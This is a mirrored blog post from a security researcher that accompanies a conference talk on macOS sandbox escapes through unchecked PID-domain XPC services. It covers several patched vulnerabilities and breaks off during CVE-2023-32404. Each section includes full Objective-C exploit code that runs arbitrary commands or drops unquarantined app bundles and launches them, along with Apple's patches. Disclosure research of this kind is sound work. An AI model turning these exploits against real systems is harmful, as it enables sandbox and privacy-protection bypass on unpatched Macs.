<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/">Original</a>
    <h1>Multiple new macOS sandbox escape vulnerabilities</h1>
    
    <div id="readability-page-1" class="page"><div>
    <p>This is a blog post for my presentation at the conference <a href="https://powerofcommunity.net/2024.htm">POC2024</a>. The slides are uploaded <a href="https://github.com/jhftss/jhftss.github.io/blob/main/res/slides/A%20New%20Era%20of%20macOS%20Sandbox%20Escapes.pdf">here</a>.</p>

<p>In the macOS system, most processes are running in a restricted sandbox environment, whether they are Apple’s own services or third-party applications. Consequently, once an attacker gains Remote Code Execution (RCE) from these processes, their capabilities are constrained. The next step for the attacker is to circumvent the sandbox to gain enhanced execution capabilities and broader file access permissions.</p>

<p>But how to discover sandbox escape vulnerabilities? Upon reviewing the existing issues, I unearthed a significant <strong>overlooked attack surface</strong> and a novel attack technique. This led to the discovery of <strong>multiple new sandbox escape vulnerabilities</strong>: CVE-2023-27944, CVE-2023-32414, CVE-2023-32404, CVE-2023-41077, CVE-2023-42961, CVE-2024-27864, CVE-2023-42977, <strong>and more</strong>.</p>



<h3 id="the-app-sandbox">The App Sandbox</h3>

<p>Nowadays, as required by the Mac AppStore, most applications are running with the <strong>App Sandbox</strong> restrictions. The sandboxed application must have the entitlement “<strong>&lt;key&gt;com.apple.security.app-sandbox&lt;/key&gt;&lt;true/&gt;</strong>”. The sandbox restrictions are applied in the <strong>dyld initialization</strong> function before the app’s main function. After entering the sandbox, it will be <strong>containerized</strong> and all the file operations will be limited to its data container path.</p>

<p>It should be noted that all the files dropped by the sandboxed application will be marked as <strong>quarantined by default</strong>. The dropped files will have the special <strong>quarantine extended attribute</strong>. And the extended attribute can’t be removed by the sandboxed app due to the configuration in the sandbox profile:</p>

<div><div><pre><code>(deny file-write-xattr (xattr &#34;com.apple.quarantine&#34;) (with no-log)))
</code></pre></div></div>

<p>According to the Apple’s design guide:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019161759137.png" alt="image-20241019161759137"/></p>

<p>The applications without App Sandbox have unrestricted access to all user data and system resources. While the applications with the sandbox restrictions have only limited access.</p>

<p>Specifically, the capabilities of a sandboxed application are defined in the rule configuration file <code>/System/Library/Sandbox/Profiles/application.sb</code>:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019162228998.png" alt="image-20241019162228998"/></p>

<p>For example, it will restrict access to certain <strong>system resources</strong> such as network and hardware. It also restricts the <strong>filesystem access</strong> and only a limited number of <strong>Mach services</strong> are reachable from a sandboxed application.</p>

<p>BTW, the <strong>forked</strong> child process will also <strong>inherit</strong> the application sandbox restrictions of the parent process. But the process launched via the <code>LaunchService.framework</code> <strong>don’t inherit</strong> the sandbox restriction. For example, you can launch a non-sandboxed application via the system <code>open</code> command directly.</p>

<h3 id="the-service-sandbox">The Service Sandbox</h3>

<p>Compared to the common application sandbox, the <strong>Service Sandbox</strong> is a bit different.</p>

<p>Most Apple’s <strong>daemon services</strong> are running in a <strong>Service Sandbox</strong> context. They are restricted by the sandbox profiles defined in these system locations:</p>

<div><div><pre><code>/System/Library/Sandbox/Profiles/*.sb
/usr/share/sandbox/*.sb
</code></pre></div></div>

<p>The sandbox restrictions are applied in the service’s <code>main</code> function by calling the API <code>sandbox_init_XXX</code>, specified with a sandbox profile name or path <strong>manually</strong>. After entering the sandbox, they are usually <strong>not containerized</strong>.</p>

<p>Most importantly, the dropped files are <strong>not quarantined by default</strong>, unless the <strong>quarantine-related</strong> APIs are invoked <strong>manually</strong>.</p>



<h2 id="the-old-common-ways">The Old Common Ways</h2>

<h3 id="attack-via-the-launchserviceframework">Attack via the LaunchService.framework</h3>

<p>The first common method is to attack the non-sandboxed applications via the system LaunchService framework.</p>

<p>The application could natively exist on the macOS system, an example is the <a href="https://i.blackhat.com/EU-21/Wednesday/EU-21-Waisberg-Skeletons-In-The-App-Sandbox.pdf">CVE-2021-30864</a>, which can manipulate the <strong>$HOME</strong> environment variable for the system non-sandboxed application <strong>Terminal.app</strong>. When the Terminal application is launched, the malicious payload under the controlled home path <code>$HOME/.profile</code> will be executed without the sandbox restriction.</p>

<p>Another attack scenario is to <strong>drop a new non-sandboxed application</strong> and then launch it. However, the newly dropped application will be <strong>quarantined</strong> and prevented from launching! So if we can drop a file or folder without being quarantined, then we can bypass the app sandbox completely. The example is the <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html">CVE-2023-32364</a>, which abuses the <strong>devfs</strong> to drop a folder without being quarantined because the <strong>devfs</strong> doesn’t support the extended attributes.</p>

<h3 id="attack-the-available-mach-services">Attack the available Mach services</h3>

<p>The second common way to escape the sandbox is to attack the available Mach services listed in the app sandbox profile.</p>

<p>All Mach service information on the system is stored in the file <code>/System/Library/xpc/launchd.plist</code>. And we can check if a Mach service is available to a sandboxed application by using the <code>bootstrap_look_up</code> API. So, it’s easy for us to enumerate all the Mach services available to app sandbox like this:</p>

<div><div><pre><code>void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &amp;service_port);
    if (!err) {
      NSLog(@&#34;available service:%s&#34;, serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary&lt;NSString*, id&gt;* dict = [NSDictionary dictionaryWithContentsOfFile:@&#34;/System/Library/xpc/launchd.plist&#34;];
    NSDictionary&lt;NSString*, id&gt;* launchDaemons = dict[@&#34;LaunchDaemons&#34;];
    for (NSString* key in launchDaemons) {
      NSDictionary&lt;NSString*, id&gt;* job = launchDaemons[key];
      NSDictionary&lt;NSString*, id&gt;* machServices = job[@&#34;MachServices&#34;];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
</code></pre></div></div>

<p>Note that these Mach services exist either in the <strong>System domain</strong> or the <strong>User domain</strong>.</p>

<p>More XPC services available to app sandbox are ignored by our researchers!</p>

<h2 id="the-new-overlooked-one">The New Overlooked One</h2>

<p>The overlooked XPC services are those that exist in the <strong>PID domain</strong>.</p>

<p>In contrast to old common XPC services that exist in the <strong>System/User domain</strong>, their service type is “<strong>Application</strong>” type rather than the “<strong>System</strong>” or “<strong>User</strong>” type. And they will be launched upon request by an app and terminate when the requesting application exits.</p>

<p>The XPC services for the <strong>System/User domain</strong> are reachable to a sandboxed application only if they are defined in the sandbox profile “<strong>application.sb</strong>”. But all XPC services required by an app and its framework are visible to the app’s <strong>PID domain</strong>.</p>

<p>It seems that most XPC services for the <strong>PID domain</strong> are not expected to be invoked from a sandboxed application, so there are no additional entitlement checks or sandbox checks for the incoming XPC clients.</p>

<p>I drew a table to explain their differences:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019165127768.png" alt="image-20241019165127768"/></p>

<p>Let’s take the <code>SystemShoveService.xpc</code> as an example:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019165457530.png" alt="image-20241019165457530"/></p>

<p>It is an XPC bundle inside the system private <code>ShoveService.framework</code>. From the infoPlist dictionary, we can see that its “Service Type” is “<strong>Application</strong>” and its bundle identifier is “<strong>com.apple.installandsetup.shoveservice.system</strong>”.</p>

<p>So, how to send requests to this XPC service from a sandboxed application?</p>

<p>Through my research, I found that registering the XPC service to a sandboxed application’s PID domain is as simple as a single line of code:</p>

<div><div><pre><code>[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework&#34;]load];
</code></pre></div></div>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019170019639.png" alt="image-20241019170019639"/></p>

<p>From the call stack backtrace of bundle loading, we can see that the XPC service will be <strong>registered</strong> to the app’s PID domain <strong>automatically when the corresponding framework is loaded</strong>.</p>

<p><code>SystemShoveService.xpc</code> does’t check the requested XPC client, so it can be exploited to <strong>escape the app sandbox</strong> after loading the <code>ShoveService.framework</code>. Moreover, it has the powerful SIP-related entitlement “<strong>com.apple.rootless.install</strong>”, and thus it can be exploited to <strong>bypass the SIP protection at the same time</strong>.</p>

<p>The vulnerability has been designated as <strong>CVE-2022-26712</strong>. More details can be found from <a href="https://jhftss.github.io/CVE-2022-26712-The-POC-For-SIP-Bypass-Is-Even-Tweetable/">my previous blogpost</a>.</p>

<p>Generally speaking, all XPC services with the Service Type “<strong>Application</strong>” are <strong>potential targets</strong> to escape the app sandbox. So we can explore this overlooked attack surface by enumerating the XPC services in the system (private) frameworks:</p>

<div><div><pre><code>find /System/Library/Frameworks -name *.xpc
find /System/Library/PrivateFrameworks -name *.xpc
</code></pre></div></div>

<p>After discovering an XPC service for <strong>PID Domain</strong> that doesn’t check the incoming XPC client, we can attempt to attack the <strong>potential target</strong> by using the following two methods:</p>

<ol>
  <li>Drop an app <strong>folder</strong> without being quarantined. (Get a full sandbox escape like the <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html">CVE-2023-32364</a> did.)</li>
  <li>Drop a <strong>file</strong> without being quarantined. (A <strong>ZIP</strong> or <strong>DMG</strong> file that contains a non-sandboxed application.)</li>
</ol>

<p>After diving into the new overlooked attack surface, I managed to discover dozens of new sandbox escape vulnerabilities. Next are the details.</p>



<h2 id="beta-no-cve-1">Beta-No-CVE-1</h2>

<p>Apple just credited me in their <a href="https://support.apple.com/en-gb/120950">additional recognitions</a>:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172223066.png" alt="image-20241019172223066"/></p>

<p>You may wonder why there’s no CVE assigned for this vulnerability.</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019173439785.png" alt="image-20241019173439785"/></p>

<p>According to Apple, “CVEs are only assigned to software vulnerabilities previously released to production and not to vulnerabilities for beta-only software.” This vulnerability <strong>only affects the macOS Sonoma Beta version</strong>.</p>

<h3 id="the-issue">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><div><pre><code>/System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
</code></pre></div></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020105753261.png" alt="image-20241020105753261"/></p>

<p>The <code>SKRemoteTaskRunnerProtocol</code> has only one method</p>

<p>“<code>runTask:arguments:withReply:</code>”.</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020105834371.png" alt="image-20241020105834371"/></p>

<p>This only XPC method is designed to execute an arbitrary command with the specified arguments:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020105909140.png" alt="image-20241020105909140"/></p>

<p>At line 30, the <strong>executable path</strong> and <strong>arguments</strong> are controlled by the sandboxed XPC client. Therefore, an attacker can abuse this XPC method to execute an arbitrary system command directly without any sandbox restrictions.</p>

<h3 id="the-exploit-and-demo">The exploit and demo</h3>

<div><div><pre><code>@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@&#34;/System/Library/PrivateFrameworks/StorageKit.framework&#34;] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@&#34;com.apple.storagekitfsrunner&#34;];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@&#34;connection interrupted!&#34;);}];
    [conn setInvalidationHandler:^{NSLog(@&#34;connection invalidated!&#34;);}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@&#34;/usr/bin/touch&#34;] arguments:@[@&#34;/tmp/sbx&#34;] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@&#34;run task result:%@, error:%@&#34;, bSucc, error);
    }];
}
</code></pre></div></div>

<p>Demo link: https://youtu.be/MYkdmFOUyFA</p>

<h3 id="the-patch">The patch</h3>

<p>Apple promptly resolved the vulnerability prior to releasing macOS Sonoma 14.0 by <strong>completely removing the vulnerable XPC service</strong> from the operating system.</p>

<h2 id="beta-no-cve-2">Beta-No-CVE-2</h2>

<p>There is no CVE assigned for this vulnerability too due to the same <strong>Beta-only</strong> reason.</p>

<p>Apple just credited me in their <a href="https://support.apple.com/en-gb/120950">additional recognitions</a>:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172506665.png" alt="image-20241019172506665"/></p>

<h3 id="the-issue-1">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><div><pre><code>/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
</code></pre></div></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020111428188.png" alt="image-20241020111428188"/></p>

<p>The <code>AudioAnalyticsHelperServiceProtocol</code> has two methods:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020111649270.png" alt="image-20241020111649270"/></p>

<p>The issue exists in the second XPC method “<code>createZipAtPath:hourThreshold:withReply:</code>”. The following is pseudo-code from the Objective-c class <code>AudioAnalyticsHelperService</code>:</p>

<div><div><pre><code>// reversed from the Objective-c class AudioAnalyticsHelperService

-(void) createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply {
    NSString *compressPath = [path stringByAppendingPathComponent:@&#34;compressed&#34;];
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:compressPath]) {
        [fm createDirectoryAtPath:compressPath withIntermediateDirectories:YES attributes:nil error:nil];
    }
    
    for (NSString *item in [fm contentsOfDirectoryAtPath:path error:nil]) {
        if ([[item pathExtension] isEqualToString:@&#34;json&#34;]) {// &amp;&amp; the file creation date meets the requirement
            NSString *srcPath = [path stringByAppendingPathComponent:item];
            NSString *dstPath = [compressPath stringByAppendingPathComponent:item];
            [fm moveItemAtPath:srcPath toPath:dstPath error:nil];
        }
    }
    
    NSString *zipPath = [path stringByAppendingPathComponent:[NSString stringWithFormat:@&#34;audio_analytics_reporting_%@.zip&#34;, [self nowTimeString]]];
    [self createZipArchiveForURL:[NSURL fileURLWithPath:compressPath] destinationURL:[NSURL fileURLWithPath:zipPath]];
}
</code></pre></div></div>

<p>As we can see here, it helps to compress an arbitrary path that is specified by the XPC client.</p>

<p>It first creates a folder named <code>compressed</code> in the specified path, if the path does not exist. It then enumerates the files in the specified path with the <code>json</code> suffix and moves them to the <code>compressed</code> folder. In the file move operation, an attacker can move an arbitrary file to an arbitrary location by replacing the <code>compressed</code> folder with a symlink. The source file content is not checked, but the destination file path must have the suffix <code>json</code>.</p>

<p>Finally, it creates a zip file from the <code>compressed</code> folder.</p>

<p>Note that the <strong>newly generated zip file will not be quarantined</strong> because the XPC service itself is not sandboxed at all.</p>

<h3 id="the-exploit-and-demo-1">The exploit and demo</h3>

<div><div><pre><code>@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@&#34;======== preparing payload at the current path:%@&#34;, currentPath);
    system(&#34;mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json&#34;);
    [@&#34;#!/bin/bash\ntouch /tmp/sbx\n&#34; writeToFile:@&#34;compressed/poc.app/Contents/MacOS/poc&#34; atomically:YES encoding:NSUTF8StringEncoding error:0];
    system(&#34;chmod +x compressed/poc.app/Contents/MacOS/poc&#34;);
    
    [[NSBundle bundleWithPath:@&#34;/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework&#34;] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@&#34;com.apple.internal.audioanalytics.helper&#34;];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @&#34;zip&#34;]) {
                // open the zip
                NSString *cmd = [@&#34;open &#34; stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@&#34;open /Users/%@/Downloads/%@/poc.app&#34;, NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
</code></pre></div></div>

<p>Demo link: https://youtu.be/7zd2Lun5r2s</p>

<h3 id="the-patch-1">The patch</h3>

<p>Apple quickly addressed the vulnerability prior to releasing macOS Sonoma 14.0 by checking the entitlement “<strong>com.apple.audioanalytics.helper.service</strong>” from the incoming XPC client:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020112102296.png" alt="image-20241020112102296"/></p>

<p>If the client doesn’t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly.</p>

<p>Now in the latest macOS, the private <code>AudioAnalyticsInternal.framework</code> and the XPC service have been removed completely.</p>

<h2 id="cve-2023-27944">CVE-2023-27944</h2>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172639306.png" alt="image-20241019172639306"/></p>

<h3 id="the-issue-2">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><div><pre><code>/System/Library/PrivateFrameworks/TrialServer.framework/XPCServices/TrialArchivingService.xpc
</code></pre></div></div>

<p>This XPC service will enter the <strong>Service Sandbox</strong> by using the sandbox profile <code>/System/Library/Sandbox/Profiles/com.apple.trial.TrialArchivingService.sb</code>:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020113955167.png" alt="image-20241020113955167"/></p>

<p>However, the dropped files will not be quarantined.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020112619070.png" alt="image-20241020112619070"/></p>

<p>The <code>TrialArchivingServiceProtocol</code> has four methods:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020112735952.png" alt="image-20241020112735952"/></p>

<p>The issue exists in the XPC method “<code>extractArchiveFromHandle:withArchiveName:toDirectory:destDirExtension:postExtractionCompression:completion:</code>”.</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020112903145.png" alt="image-20241020112903145"/></p>

<p>It helps to extract an archive file passed from a sandboxed application to a specified location. However, it <strong>doesn’t pass the quarantine extended attribute to the extracted content</strong>.</p>

<h3 id="the-exploit-and-demo-2">The exploit and demo</h3>

<p>There is a small challenge to exploit the issue.</p>

<p>By abusing the XPC method, the macho file in the archive will lose the <strong>executable (X)</strong> permission after the extraction. So the extracted application cannot be launched directly. Then I came up with a similar vulnerability to overcome this challenge: <a href="https://breakpoint.sh/posts/bypassing-the-macos-gatekeeper">CVE-2021-30990</a> can be exploited not only to bypass the gatekeeper, but also to escape the application sandbox. The trick to that exploit is to use symlink rather than the macho file itself.</p>

<p>Then I encountered another new challenge:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020113237752.png" alt="image-20241020113237752"/></p>

<p>This XPC method only supports to extract <strong>directories</strong> and <strong>regular files</strong>, and does not allow extracting <strong>symlink</strong> from the archive.</p>

<p>To overcome the new challenge, I extract the payload application to the sandboxed <strong>app container path</strong>, where the sandboxed app has the read and write permission. (Luckily, the service sandbox profile is not too strict here.) Next, I can create the symlink from the sandboxed application directly, or just assign the executable permission to the extracted macho by calling the API <code>chmod</code>.</p>

<p>(Another simple solution is to archive the payload application twice. Abusing the vulnerable XPC method to unpack the external zip file and then using the system <code>open</code> command to unpack the inner zip file.)</p>

<p>The exploit code is as follows:</p>

<div><div><pre><code>@protocol TrialArchivingServiceProtocol &lt;NSObject&gt;
- (void) extractArchiveFromHandle:(NSFileHandle *)archiveHandle withArchiveName:(NSString *)archiveName toDirectory:(NSURL *)dstURL destDirExtension:(NSString *)destDirToken postExtractionCompression:(unsigned long long)post completion:(void (^)(unsigned char))reply;
@end

void exploit_TrialArchivingService(void) {
    [[NSBundle bundleWithURL:[NSURL fileURLWithPath:@&#34;/System/Library/PrivateFrameworks/TrialServer.framework&#34;]] load];
    NSXPCConnection *connection = [[NSXPCConnection alloc] initWithServiceName:@&#34;com.apple.trial.TrialArchivingService&#34;];
    connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(TrialArchivingServiceProtocol)];
    [connection resume];
    // archive file handle
    NSURL *payload = [[NSBundle mainBundle] URLForResource:@&#34;sbx.app&#34; withExtension:@&#34;zip&#34;];
    NSFileHandle *archiveHandle = [NSFileHandle fileHandleForReadingAtPath:[payload path]];
    // destination directory
    NSString *dstPath = [NSHomeDirectory() stringByAppendingPathComponent:@&#34;Library/Trial/v0/AssetStore&#34;];
    [[NSFileManager defaultManager]createDirectoryAtPath:dstPath withIntermediateDirectories:YES attributes:0 error:0];
    NSURL *dstURL = [NSURL fileURLWithPath:dstPath];
    // destination directory sandbox extension
    typedef const char *(*PFN)(const char *extension_class, const char *path, uint32_t flags);
    void *h = dlopen(&#34;/usr/lib/system/libsystem_sandbox.dylib&#34;, 2);
    PFN sandbox_extension_issue_file = (PFN)dlsym(h, &#34;sandbox_extension_issue_file&#34;);
    const char *token = sandbox_extension_issue_file(&#34;com.apple.app-sandbox.read-write&#34;, [dstPath UTF8String], 2);
    // fire the hole, it will extract the archive file bundle to this App container, without the quarantine extended attribute
    __block dispatch_semaphore_t done = dispatch_semaphore_create(0);
    [connection.remoteObjectProxy extractArchiveFromHandle:archiveHandle withArchiveName:@&#34;exploit&#34; toDirectory:dstURL destDirExtension:[NSString stringWithUTF8String:token] postExtractionCompression:0 completion:^(unsigned char ret) {
        NSLog(@&#34;ret:%d&#34;, ret);
        dispatch_semaphore_signal(done);
    }];
    dispatch_semaphore_wait(done, DISPATCH_TIME_FOREVER);
    // However, this extraction will drop the executable (X) permission. Create a symlink as a workaround
    NSString *target = [dstPath stringByAppendingPathComponent:@&#34;sbx.app/Contents/MacOS/Automator Application Stub&#34;];
    symlink(&#34;/System/Library/CoreServices/Automator Application Stub.app/Contents/MacOS/Automator Application Stub&#34;, [target UTF8String]);
    NSString *openCmd = [NSString stringWithFormat:@&#34;open %@/sbx.app&#34;, dstPath];
    system([openCmd UTF8String]);
}
</code></pre></div></div>

<p>Demo link: https://youtu.be/VbqGbxmSLoA</p>

<h3 id="the-patch-2">The patch</h3>

<p>Apple addressed the vulnerability in macOS Ventura 13.3 by checking the entitlement “<strong>com.apple.TrialArchivingService.internal</strong>” from the incoming XPC client:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020145445876.png" alt="image-20241020145445876"/></p>

<p>If the client doesn’t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly.</p>

<h2 id="cve-2023-32414">CVE-2023-32414</h2>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172718969.png" alt="image-20241019172718969"/></p>

<h3 id="the-issue-3">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><div><pre><code>/System/Library/PrivateFrameworks/DesktopServicesPriv.framework/XPCServices/ArchiveService.xpc
</code></pre></div></div>

<p>This XPC service will enter the service sandbox by using a sandbox profile, but the <strong>dropped files will not be quarantined</strong>.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020145606528.png" alt="image-20241020145606528"/></p>

<p>The <code>DSArchiveServiceProtocolInternal</code> has five methods:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020145705526.png" alt="image-20241020145705526"/></p>

<p>The issue exists in the XPC method “<code>unarchiveItemWithURLWrapper:…</code>”:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020145834370.png" alt="image-20241020145834370"/></p>

<p>This XPC method helps to unarchive an item passed from a sandboxed application to a specified location. However, it doesn’t pass the quarantine extended attribute to the extracted content. Therefore, a sandboxed application can drop arbitrary files without being marked as quarantined by abusing this XPC method.</p>

<h3 id="the-exploit-and-demo-3">The exploit and demo</h3>

<p>The XPC client has already been implemented in the Objective-c class <code>DSArchiveService</code> within the <code>DesktopServicesPriv.framework</code>. The exploit code is as follows:</p>

<div><div><pre><code>@interface DSArchiveService : NSObject
- (void)unarchiveItemAtURL:(id) itemURL passphrase:(id) password destinationFolderURL:(id) dstURL completionHandler:(void (^)(NSURL *, NSError *))arg2;
@end

void prepare(void) {
    NSLog(@&#34;preparing %@/payload.zip&#34;, NSHomeDirectory());
    system(&#34;mkdir -p poc.app/Contents/MacOS; mkdir dst&#34;);
    [@&#34;#!/bin/bash\ntouch /tmp/sbx\n&#34; writeToFile:@&#34;poc.app/Contents/MacOS/poc&#34; atomically:YES encoding:NSUTF8StringEncoding error:0];
    system(&#34;chmod +x poc.app/Contents/MacOS/poc; zip -r payload.zip poc.app&#34;);
}

void exploit_ArchiveService(void) {
    [[NSBundle bundleWithURL:[NSURL fileURLWithPath:@&#34;/System/Library/PrivateFrameworks/DesktopServicesPriv.framework&#34;]] load];
    DSArchiveService *service = [[objc_getClass(&#34;DSArchiveService&#34;) alloc]init];
    
    NSString *payloadPath = [NSHomeDirectory() stringByAppendingPathComponent:@&#34;payload.zip&#34;];
    NSString *dstPath = [NSHomeDirectory() stringByAppendingPathComponent:@&#34;dst&#34;];
    [service unarchiveItemAtURL:[NSURL fileURLWithPath:payloadPath] passphrase:nil destinationFolderURL:[NSURL fileURLWithPath:dstPath] completionHandler:^(NSURL *dstFolder, NSError *error) {
        NSLog(@&#34;dstFolderURL:%@, error:%@&#34;, dstFolder, error);
        NSString *cmd = [NSString stringWithFormat:@&#34;open %@/poc.app&#34;, [dstFolder path]];
        system([cmd UTF8String]);
    }];
}
</code></pre></div></div>

<p>Demo link: https://youtu.be/RMyKyHYibSk</p>

<h3 id="the-patch-3">The patch</h3>

<p>Apple addressed the vulnerability in macOS Ventura 13.4 by checking the entitlement “<strong>com.apple.private.ArchiveService.XPC</strong>” from the incoming XPC client:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150402830.png" alt="image-20241020150402830"/></p>

<p>If the client doesn’t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly.</p>

<h2 id="cve-2023-32404">CVE-2023-32404</h2>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172755928.png" alt="image-20241019172755928"/></p>

<h3 id="the-issue-4">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><div><pre><code>/System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc
</code></pre></div></div>

<p>The XPC service can be launched without any sandbox restrictions. So it can be exploited to escape the application sandbox.</p>

<p>Moreover, it also has the special TCC entitlement in its code signature for <strong>Full Disk Access</strong>:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150516910.png" alt="image-20241020150516910"/></p>

<p>Therefore, it can also be exploited to bypass the TCC protection completely!</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150601039.png" alt="image-20241020150601039"/></p>

<p>The <code>WFFileAccessHelperProtocol</code> has only one method <code>extendAccessToURL:completion:</code>:</p>

<p><img src="https://hannahilea.com/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150641370.png" alt="image-20241020150641370"/></p>

<p>The only XPC method is designed to grant the read and write permission of an arbitrary URL to the XPC client:</p>

